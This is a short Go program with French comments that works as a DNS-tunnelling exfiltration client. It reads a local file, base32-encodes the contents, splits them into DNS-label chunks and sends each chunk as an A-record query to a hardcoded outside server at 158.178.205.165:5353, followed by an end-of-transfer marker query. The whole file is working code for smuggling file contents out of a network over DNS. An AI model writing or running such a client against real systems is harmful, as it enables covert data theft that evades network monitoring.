/*
TODO :
plus de fichier en entrée



*/

package main

import (
	"encoding/base32"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/miekg/dns"
)

func main() {
	// Le texte à encoder en base32
	filePath := "test.txt"

	// Encode le texte en base32 (sans padding pour un domaine valide)
	//encodedText1 := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(text))

	// Encoder le fichier en base32
	encoded, err := encodeFileToBase32(filePath)
	if err != nil {
		fmt.Println("Erreur :", err)
		return
	}

	encoded_with_dots := Dot38Chars(encoded)

	// Séparer le texte en segments à partir des points
	segments := strings.Split(encoded_with_dots, ".")

	// regarde les segments par paquets de 2
	for i := 0; i < len(segments); i += 2 {
		// vérif si on a deux segments ou un seul
		if i+1 < len(segments) {
			// Prendre deux segments et les joindre avec un point et en ajoute un a la fin pour pouvoir envoyer la requests
			data := segments[i] + "." + segments[i+1] + "."

			createDNSRequest(data)

		} else {
			// Si il reste que un segemnt l'envoyer et ajoute un autre point a la fin pour pouvoir envoyer la requests
			data := segments[i] + "."

			createDNSRequest(data)
		}
	}

	//Pour signaler au srv que l'envoie de data est terminé et que il commence à décodé
	createDNSRequest("mvxgi.mvxgi.")

}

func encodeFileToBase32(filePath string) (string, error) {
	// Ouvrir le fichier à envoyé
	file, err := os.Open(filePath)
	if err != nil {
		return "", fmt.Errorf("impossible d'ouvrir le fichier : %w", err)
	}
	defer file.Close()

	// Lire tout le contenu du fichier
	content, err := io.ReadAll(file)
	if err != nil {
		return "", fmt.Errorf("erreur lors de la lecture du fichier : %w", err)
	}

	// Encoder le contenu en base32
	base32Encoded := base32.StdEncoding.EncodeToString(content)

	return base32Encoded, nil
}

func Dot38Chars(text string) string {
	result := ""
	for len(text) > 38 {
		// Prend les 38 premier char et ajoute un point (la limite est à 39 mais je compte le point en +)
		result += text[:38] + "."
		// Réduit la chaîne restante
		text = text[38:]
	}
	// Ajoute le reste de la chaîne
	result += text
	return result
}

func createDNSRequest(encoded string) {
	// Adresse du serveur DNS et msg à envoyé
	dnsServer := "158.178.205.165:5353"
	domain := encoded

	// Créer la requête DNS
	message := new(dns.Msg)
	message.SetQuestion(domain, dns.TypeA)

	// Créer un client DNS
	client := new(dns.Client)
	client.Net = "udp" // Utiliser UDP comme protocole (par défaut)

	// Envoyer la requête
	resp, _, err := client.Exchange(message, dnsServer)
	if err != nil {
		fmt.Println("Erreur lors de la requête DNS :", err)
		return
	}

	// Afficher la réponse si elle est reçue
	fmt.Println(resp.String())
}
